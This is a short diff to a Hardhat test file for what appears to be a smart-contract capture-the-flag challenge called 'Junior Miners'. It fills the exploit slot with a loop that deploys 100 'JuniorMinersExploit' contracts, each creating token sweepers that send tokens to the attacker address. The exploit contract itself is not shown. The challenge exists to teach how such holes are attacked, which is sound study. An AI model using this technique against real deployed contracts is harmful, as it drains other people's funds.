@@ -24,6 +24,13 @@ describe('[Challenge] Junior Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.timeout(0);
+        for (let nonce = 0; nonce < 100; nonce++) {
+            // Have each JuniorMinersExploit contract create 100 TokenSweepers.
+            // await (await ethers.getContractFactory('JuniorMinersExploit', deployer)).deploy(attacker.address, this.token.address, 100);
+            await (await ethers.getContractFactory('JuniorMinersExploit', attacker)).deploy(attacker.address, this.token.address, 100);
+        }
+    
     });
 
     after(async function () {
